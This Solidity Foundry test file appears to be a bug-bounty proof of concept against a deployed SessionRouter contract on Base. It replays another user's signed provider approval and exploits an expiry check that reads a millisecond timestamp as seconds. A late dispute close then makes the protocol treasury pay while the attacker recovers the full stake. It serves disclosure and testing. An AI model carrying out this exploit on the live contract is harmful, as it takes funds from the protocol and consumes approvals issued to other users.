// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {PocData} from "./PocData.sol";

/// @notice Minimal cheatcode interface (avoids a forge-std dependency).
interface Vm {
    function createSelectFork(string calldata url, uint256 blockNumber) external returns (uint256);
    function prank(address msgSender) external;
    function deal(address token, address to, uint256 amount, bool adjust) external;
    function load(address target, bytes32 slot) external view returns (bytes32);
    function store(address target, bytes32 slot, bytes32 value) external;
    function warp(uint256 newTimestamp) external;
    function sign(uint256 privateKey, bytes32 digest) external returns (uint8, bytes32, bytes32);
    function snapshot() external returns (uint256);
    function revertTo(uint256 snapshotId) external returns (bool);
}

struct Bid {
    address provider;
    bytes32 modelId;
    uint256 pricePerSecond;
    uint256 nonce;
    uint128 createdAt;
    uint128 deletedAt;
}

struct ProviderInfo {
    string endpoint;
    uint256 stake;
    uint128 createdAt;
    uint128 limitPeriodEnd;
    uint256 limitPeriodEarned;
    bool isDeleted;
}

interface IDiamondReads {
    function getBid(bytes32 bidId_) external view returns (Bid memory);
    function getProvider(address provider_) external view returns (ProviderInfo memory);
    function getFundingAccount() external view returns (address);
    function getProvidersTotalClaimed() external view returns (uint256);
    function startOfTheDay(uint128 timestamp_) external view returns (uint128);
    function closeSession(bytes calldata receiptEncoded_, bytes calldata signature_) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

struct Session {
    address user;
    bytes32 bidId;
    uint256 stake;
    bytes closeoutReceipt;
    uint256 closeoutType;
    uint256 providerWithdrawnAmount;
    uint128 openedAt;
    uint128 endsAt;
    uint128 closedAt;
    bool isActive;
    bool isDirectPaymentFromUser;
}

interface ISessionRouterFork {
    function openSession(
        address user_,
        uint256 amount_,
        bool isDirectPaymentFromUser_,
        bytes calldata approvalEncoded_,
        bytes calldata signature_
    ) external returns (bytes32);
    function getSession(bytes32 sessionId_) external view returns (Session memory);
    function getIsProviderApprovalUsed(bytes memory approval_) external view returns (bool);
}

/// @title SessionRouter (Base diamond) — provider approval is a bearer instrument
/// @notice Fork PoC against DEPLOYED bytecode, Base block 58,597,769 — the block
///         immediately before a real openSession tx (0xf074...62fa, block 58,597,770)
///         whose provider approval + signature are replayed verbatim (see PocData.sol).
///         The approval names user 0xC599...2FBF. An unrelated attacker consumes it.
///
/// Findings proven here:
///  1. openSession never checks that the user named inside the signed provider
///     approval equals the session user — the approval is a bearer instrument.
///     (The check existed pre-2024-11-26 as `SessionApprovedForAnotherUser`;
///     commit 605cfcc5 removed it; the error is still declared in ISessionRouter.)
///  2. The approval's expiry (SIGNATURE_TTL = 600 s) is never enforced in
///     production: the reference signer encodes the timestamp in MILLISECONDS
///     (1,794,909,929,086) while the contract compares it to block.timestamp
///     in seconds, so the approval stays valid effectively forever until used.
contract SessionRouterApprovalPoC {
    Vm internal constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    address internal constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address internal constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    address internal constant REAL_USER = 0xC599884ACB421BD548D6fAe444CD075DFB012FBF;
    address internal constant ATTACKER = address(0xA77ACE);
    uint256 internal constant AMOUNT = 610481637884437570393; // exact stake of the real tx
    uint256 internal constant FORK_BLOCK = 58597769;

    ISessionRouterFork internal router = ISessionRouterFork(DIAMOND);
    IERC20 internal mor = IERC20(MOR);

    function setUp() public {
        vm.createSelectFork("https://base-rpc.publicnode.com", FORK_BLOCK);
    }

    /// @dev Sets the attacker's MOR balance directly in fork storage (the
    ///      attacker funding themselves with MOR they could buy on-market is a
    ///      legitimate unprivileged precondition; no protocol state is altered
    ///      for anyone else). Probes for the ERC20 balance mapping slot.
    function _dealMor(address to, uint256 amount) internal {
        for (uint256 slot = 0; slot < 40; slot++) {
            bytes32 loc = keccak256(abi.encode(to, slot));
            bytes32 prev = vm.load(MOR, loc);
            vm.store(MOR, loc, bytes32(amount));
            if (mor.balanceOf(to) == amount) return;
            vm.store(MOR, loc, prev);
        }
        revert("balance slot not found");
    }

    function _assertTrue(bool c, string memory m) internal pure {
        if (!c) revert(m);
    }

    function _assertEqAddr(address a, address b, string memory m) internal pure {
        if (a != b) revert(m);
    }

    /// The signed approval names REAL_USER and carries a millisecond timestamp.
    function test_approvalNamesRealUser_andTimestampIsMillis() public view {
        (bytes32 bidId, uint256 chainId, address namedUser, uint128 ts) =
            abi.decode(PocData.APPROVAL, (bytes32, uint256, address, uint128));
        _assertTrue(bidId == bytes32(0xec3b5f770df097d73c8fd2bf4e49ad1031f7c750af3c02b44195c6662b814745), "bidId");
        _assertTrue(chainId == 8453, "chainId");
        _assertEqAddr(namedUser, REAL_USER, "approval must name the real user");
        // block.timestamp at the fork is 1,794,909,927 s; ts is 1,794,909,929,086 -> ms
        _assertTrue(uint256(ts) > block.timestamp * 100, "timestamp is milliseconds, not seconds");
    }

    /// ATTACK: an unrelated account consumes the approval issued for REAL_USER.
    function test_attackerConsumesApprovalIssuedForAnotherUser() public {
        _assertTrue(!router.getIsProviderApprovalUsed(PocData.APPROVAL), "approval unused at fork block");

        _dealMor(ATTACKER, AMOUNT);
        vm.prank(ATTACKER);
        mor.approve(DIAMOND, AMOUNT);

        vm.prank(ATTACKER);
        bytes32 sessionId = router.openSession(ATTACKER, AMOUNT, false, PocData.APPROVAL, PocData.SIGNATURE);

        Session memory s = router.getSession(sessionId);
        _assertEqAddr(s.user, ATTACKER, "session must belong to the attacker");
        _assertTrue(s.isActive, "session active");
        _assertTrue(s.stake == AMOUNT, "stake escrowed from attacker");
        _assertTrue(router.getIsProviderApprovalUsed(PocData.APPROVAL), "approval consumed by attacker");
    }

    /// CONTROL 1: the named user can use their own approval (baseline validity).
    function test_control_namedUserCanUseOwnApproval() public {
        // REAL_USER holds the stake and the diamond allowance in real fork state.
        vm.prank(REAL_USER);
        bytes32 sessionId = router.openSession(REAL_USER, AMOUNT, false, PocData.APPROVAL, PocData.SIGNATURE);
        Session memory s = router.getSession(sessionId);
        _assertEqAddr(s.user, REAL_USER, "session belongs to named user");
        _assertTrue(s.isActive, "session active");
    }

    /// CONTROL 2: the approval is single-use — after the attacker consumes it,
    /// the named user's own attempt reverts.
    function test_control_secondUseReverts() public {
        _dealMor(ATTACKER, AMOUNT);
        vm.prank(ATTACKER);
        mor.approve(DIAMOND, AMOUNT);
        vm.prank(ATTACKER);
        router.openSession(ATTACKER, AMOUNT, false, PocData.APPROVAL, PocData.SIGNATURE);

        vm.prank(REAL_USER);
        try router.openSession(REAL_USER, AMOUNT, false, PocData.APPROVAL, PocData.SIGNATURE) {
            revert("second use of the same approval must revert");
        } catch {
            // expected: approval already consumed (by the attacker)
        }
    }

    /// EXPIRY: two days later the same (millisecond) approval is STILL accepted,
    /// although SIGNATURE_TTL is 600 seconds.
    function test_expiryNeverEnforced_millisecondTimestamp() public {
        vm.warp(block.timestamp + 2 days);
        _dealMor(ATTACKER, AMOUNT);
        vm.prank(ATTACKER);
        mor.approve(DIAMOND, AMOUNT);
        vm.prank(ATTACKER);
        bytes32 sessionId = router.openSession(ATTACKER, AMOUNT, false, PocData.APPROVAL, PocData.SIGNATURE);
        Session memory s = router.getSession(sessionId);
        _assertEqAddr(s.user, ATTACKER, "stale approval still opens a session");
        _assertTrue(s.isActive, "session active");
    }

    function _openAsAttacker() internal returns (bytes32) {
        _dealMor(ATTACKER, AMOUNT);
        vm.prank(ATTACKER);
        mor.approve(DIAMOND, AMOUNT);
        vm.prank(ATTACKER);
        return router.openSession(ATTACKER, AMOUNT, false, PocData.APPROVAL, PocData.SIGNATURE);
    }

    function _closeLateWithBadReceipt(bytes32 sessionId, uint128 endsAt) internal {
        IDiamondReads diamond = IDiamondReads(DIAMOND);
        vm.warp(uint256(diamond.startOfTheDay(endsAt)) + 1 days + 1);
        bytes memory receipt = abi.encode(sessionId, uint256(8453), uint128(block.timestamp), uint32(0), uint32(0));
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(receipt)));
        (uint8 v, bytes32 r, bytes32 rs) = vm.sign(0xA11CE, digest);
        vm.prank(ATTACKER);
        diamond.closeSession(receipt, abi.encodePacked(r, rs, v));
    }

    /// LOSS (program Sec. 2.1.4): the unauthorized session is ultimately paid
    /// for by the protocol. The attacker opens with the stolen approval in
    /// stipend mode, lets the session run to its scheduled end, and closes it
    /// (as the session user, with a receipt signed by an unrelated key — the
    /// dispute path). Because the close is late, closeSession pays the provider
    /// IN FULL from the protocol funding account, while the attacker recovers
    /// 100% of their stake. Net effect: MOR leaves the protocol treasury for a
    /// session the provider approved for a different user; attacker cost = 0.
    function test_loss_protocolPaysForUnauthorizedSession() public {
        IDiamondReads diamond = IDiamondReads(DIAMOND);
        Bid memory bid = diamond.getBid(bytes32(0xec3b5f770df097d73c8fd2bf4e49ad1031f7c750af3c02b44195c6662b814745));
        ProviderInfo memory pinfo = diamond.getProvider(bid.provider);
        address funding = diamond.getFundingAccount();
        uint256 fundingBefore = mor.balanceOf(funding);
        uint256 providerBefore = mor.balanceOf(bid.provider);
        uint256 claimedBefore = diamond.getProvidersTotalClaimed();

        bytes32 sessionId = _openAsAttacker();
        Session memory s = router.getSession(sessionId);
        _assertEqAddr(s.user, ATTACKER, "session opened by attacker with stolen approval");

        uint256 fullReward = (uint256(s.endsAt) - uint256(s.openedAt)) * bid.pricePerSecond;
        uint256 claimCap = pinfo.stake > pinfo.limitPeriodEarned ? pinfo.stake - pinfo.limitPeriodEarned : 0;
        uint256 expectedPaid = fullReward < claimCap ? fullReward : claimCap;
        _assertTrue(expectedPaid > 0, "expected a positive provider payment");

        _closeLateWithBadReceipt(sessionId, s.endsAt);

        _assertTrue(mor.balanceOf(bid.provider) - providerBefore == expectedPaid, "provider paid the full session reward");
        _assertTrue(fundingBefore - mor.balanceOf(funding) == expectedPaid, "funding account (protocol) bore the payment");
        _assertTrue(diamond.getProvidersTotalClaimed() - claimedBefore == expectedPaid, "providersTotalClaimed increased");
        _assertTrue(mor.balanceOf(ATTACKER) == AMOUNT, "attacker recovered 100% of stake: net cost zero");
    }

    /// CONTROL 3: the on-chain expiry check itself is keyed to seconds — an
    /// approval whose timestamp is 1 hour old in SECONDS is rejected up front
    /// (before signature validation, which is why a dummy signature suffices).
    function test_control_secondsTimestampExpires() public {
        (bytes32 bidId, uint256 chainId, address namedUser,) =
            abi.decode(PocData.APPROVAL, (bytes32, uint256, address, uint128));
        bytes memory staleApproval =
            abi.encode(bidId, chainId, namedUser, uint128(block.timestamp - 1 hours));
        bytes memory dummySig = new bytes(65);

        _dealMor(ATTACKER, AMOUNT);
        vm.prank(ATTACKER);
        mor.approve(DIAMOND, AMOUNT);
        vm.prank(ATTACKER);
        try router.openSession(ATTACKER, AMOUNT, false, staleApproval, dummySig) {
            revert("seconds-expired approval must revert");
        } catch {
            // expected: rejected by the expiry check (seconds domain)
        }
    }
}
